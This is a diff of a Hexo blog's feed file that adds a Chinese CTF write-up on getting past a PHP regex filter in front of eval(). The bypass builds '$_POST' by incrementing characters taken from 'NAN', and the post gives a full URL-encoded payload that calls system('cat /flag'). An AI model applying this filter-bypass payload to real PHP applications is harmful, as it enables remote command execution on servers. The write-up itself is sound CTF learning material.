@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>PHP中的自增RCE绕过</title>
+      <link href="/2023/01/21/9ccea94598fa-q1jun/"/>
+      <url>/2023/01/21/9ccea94598fa-q1jun/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01-攻击原理"><a href="#0x01-攻击原理" class="headerlink" title="0x01 攻击原理"></a>0x01 攻击原理</h2><p>当出现类似以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>常见的绕过如取反<code>~</code>，异或<code>^</code>等都被过滤，但是<code>[ ]+$</code>等没过滤完全，就可以考虑通过自增的方法进行RCE绕过。</p><p>php是弱语言，单字符型变量自增能得到下一个字符，且单个或多个下划线<code>_</code>也可以作为变量名，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">// 此时$_为B</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="comment">//输出 string(1) &quot;B&quot;</span></span><br></pre></td></tr></table></figure><p>还能用不可见字符替换php变量名称<code>$%ff</code>(url编码)，这样就更短了。</p><p>而数组转字符串后是天然的字符串 <code>Array</code>，我们切片取A，通过自增便可得到任意一个大写字母。<br>还有1&#x2F;_&#x3D;&#x3D;INF，下划线也可快速构造NAN，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=_/_._;   <span class="comment">// NAN_</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">0</span>]); <span class="comment">//string(1) &quot;N&quot;</span></span><br></pre></td></tr></table></figure><p>这样就很快得到了字母“N”，而”POST”中的“O”和“N”很近，所以很快就可以通过自增得到“POST”。</p><p>由于<code>0</code>也是不能出现的，可以用下划线<code>_</code>代替，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=_/_._;   <span class="comment">// NAN_</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[___]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[__]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[_]); </span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/challenges# php 1.php </span><br><span class="line">string(4) &quot;NAN_&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br></pre></td></tr></table></figure><p>这样就可以很快构造出<code>$_POST[___]($_POST[_])</code>，然后只需要传入参数<code>___</code>和<code>_</code>就能完成rce了。</p><h2 id="0x02-题目详情"><a href="#0x02-题目详情" class="headerlink" title="0x02 题目详情"></a>0x02 题目详情</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230121094909830.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt;= <span class="number">105</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Hacked!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You need to pass in a string&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;long?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过自增方法可以构造出如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//用 ___ 代替 0</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[___]; <span class="comment">// NAN 取 N</span></span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$_</span>; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>/++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_____</span>.=++<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">// _.POST</span></span><br><span class="line"><span class="variable">$$_</span>[___](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>去掉注释和换行，并去掉php头，构造payload如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$_=(_/_._)[___];$__=++$_;$_____=++$_.$__;++$_/++$_;$_=_.$_____.=++$_.++$_;$$_[___]($$_[_]);&amp;___=system&amp;_=cat /flag</span><br></pre></td></tr></table></figure><p>别忘记了url编码，最终payload如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=system&amp;_=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230121102832541.png" alt="image-20230121102832541"></p><p>题目地址：</p><ul><li><p><a target="_blank" rel="noopener" href="http://ctf.q1jun.cn/challenges#ezbypass_rce-109">Q1-CTF 训练平台 (q1jun.cn)</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.qsnctf.com/challenges#ezbypass-321">青少年CTF训练平台 | 原中学生CTF平台 | 青少年CTF (qsnctf.com)</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[密码学]RSA中的dp和dq</title>
       <link href="/2023/01/13/8b3b39b14e33-q1jun/"/>
       <url>/2023/01/13/8b3b39b14e33-q1jun/</url>
@@ -1101,11 +1130,11 @@
       
         <tags>
             
+            <tag> Java </tag>
+            
             <tag> 数据结构 </tag>
             
             <tag> 算法 </tag>
-            
-            <tag> Java </tag>
             
         </tags>
       
@@ -1130,11 +1159,11 @@
       
         <tags>
             
+            <tag> Java </tag>
+            
             <tag> 数据结构 </tag>
             
             <tag> 算法 </tag>
-            
-            <tag> Java </tag>
             
         </tags>
       
